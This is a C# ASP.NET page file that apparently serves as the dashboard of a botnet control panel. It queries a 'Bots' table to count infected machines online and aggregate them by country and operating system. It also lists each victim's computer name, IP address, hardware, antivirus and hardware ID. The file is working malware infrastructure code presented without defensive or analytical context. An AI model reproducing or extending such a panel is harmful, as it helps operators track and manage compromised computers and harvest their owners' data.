﻿using System;
using System.Data;
using System.Data.SqlClient;
using System.Web.UI.WebControls;

public partial class Home : System.Web.UI.Page
{
    public string kleurSyntax;
    public string procentSyntax;

    public void Page_Load(object sender, EventArgs e)
    {
        if ((Session["Check"] == null) || (Convert.ToBoolean(Session["Check"]) == false))
        {
            Response.Redirect("Login.aspx");
        }

        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            int onnlineNow;
            int connToday;
            int connWeek;
            int connMonth;
            int connTotal;

            double connTodayPre;
            double connWeekPre;
            double connMonthPre;
            double connNowPre;

            double procent = 0;
            int amountOfCountrys;

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots;", conn))
            {
                connTotal = (int)cmd.ExecuteScalar();
                lblConnectionsTotal.Text = connTotal.ToString();
                lblTotalBots.Text = connTotal.ToString();
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -6 , GETDATE())));", conn))
            {
                onnlineNow = (int)cmd.ExecuteScalar();
                lblOnnlineNow.Text = onnlineNow.ToString();
                connNowPre = Math.Round((double)(100 * onnlineNow) / connTotal, 1);
                onlineNowPrec.Text = "data-percent=\"" + connNowPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -1, GETDATE())));", conn))
            {
                connToday = (int)cmd.ExecuteScalar();
                lblConnectionsToday.Text = connToday.ToString();
                connTodayPre = Math.Round((double)(100 * connToday) / connTotal, 1);
                connTodayPrec.Text = "data-percent=\"" + connTodayPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -7, GETDATE())));", conn))
            {
                connWeek = (int)cmd.ExecuteScalar();
                lblConnectionsWeek.Text = connWeek.ToString();
                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal, 1);
                connWeekPrec.Text = "data-percent=\"" + connWeekPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -30, GETDATE())));", conn))
            {
                connMonth = (int)cmd.ExecuteScalar();
                lblConnectionsMonth.Text = connMonth.ToString();
                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal, 1);
                connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("select count(distinct Country) from bots", conn))
            {
                amountOfCountrys = (int)cmd.ExecuteScalar() + 1;
            }

            string[] land = new string[amountOfCountrys];
            int[] landAantal = new int[amountOfCountrys];

            for (int i = 1; i < amountOfCountrys; i++)
            {
                using (SqlCommand cmd = new SqlCommand("select Country from(select distinct Country, DENSE_RANK() over (order by country) as rownum from bots) as tbl where tbl.rownum = @i", conn))
                {
                    cmd.Parameters.AddWithValue("i", i);
                    land[i] = (string)cmd.ExecuteScalar();
                }

                using (SqlCommand cmd = new SqlCommand("select count(*) from bots where Country = @land", conn))
                {
                    cmd.Parameters.AddWithValue("land", land[i]);
                    landAantal[i] = (int)cmd.ExecuteScalar();
                }

                procent = Math.Round((double)(100 * landAantal[i]) / connTotal, 1);

                kleurSyntax += "\"" + land[i] + "\" " + ":" + landAantal[i] + ", ";
                procentSyntax += "\"" + land[i] + "\" " + ":" + procent + ", ";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT BotID,PCName,IP,CPU,GPU,FirstConn,LastConn,OperatingSystem,Country,Region,Antivirus,HWID,Version FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE())));", conn))
            {
                DataSet ds = new DataSet();
                SqlDataReader reader = cmd.ExecuteReader();
                grdOnline.DataSource = reader;
                grdOnline.DataBind();
                reader.Close();
            }

            using (SqlCommand cmd = new SqlCommand("select country, count(Country)  from bots group by Country", conn))
            {
                DataSet ds = new DataSet();
                SqlDataReader reader = cmd.ExecuteReader();
                grdCountry.DataSource = reader;
                grdCountry.DataBind();
                reader.Close();
            }

            using (SqlCommand cmd = new SqlCommand("select OperatingSystem, count(OperatingSystem)from bots group by OperatingSystem", conn))
            {
                DataSet ds = new DataSet();
                SqlDataReader reader = cmd.ExecuteReader();
                grdOS.DataSource = reader;
                grdOS.DataBind();
                reader.Close();
            }
        }
    }

    protected void grdOnline_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.Header)
        {
            e.Row.Cells[0].Text = "NO.";
            e.Row.Cells[1].Text = "COMPUTER NAME";
            e.Row.Cells[2].Text = "IP ADDRESS";
            e.Row.Cells[3].Text = "CPU";
            e.Row.Cells[4].Text = "GPU";
            e.Row.Cells[5].Text = "INSTALLED";
            e.Row.Cells[6].Text = "LAST CONNECTION";
            e.Row.Cells[7].Text = "OPERATING SYSTEM";
            e.Row.Cells[8].Text = "COUNTRY";
            e.Row.Cells[9].Text = "REGION";
            e.Row.Cells[10].Text = "ANTIVIRUS";
            e.Row.Cells[11].Text = "HARDWAREID";
            e.Row.Cells[12].Text = "VERSION";
        }
        foreach (TableCell tc in e.Row.Cells)
        {
            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
        }
    }

    protected void grdCountry_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.Header)
        {
            e.Row.Cells[0].Text = "COUNTRY";
            e.Row.Cells[1].Text = "AMOUNT";
        }
        foreach (TableCell tc in e.Row.Cells)
        {
            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
        }
    }

    protected void grdOS_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.Header)
        {
            e.Row.Cells[0].Text = "OPERATING SYSTEM";
            e.Row.Cells[1].Text = "AMOUNT";
        }
        foreach (TableCell tc in e.Row.Cells)
        {
            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
        }
    }
}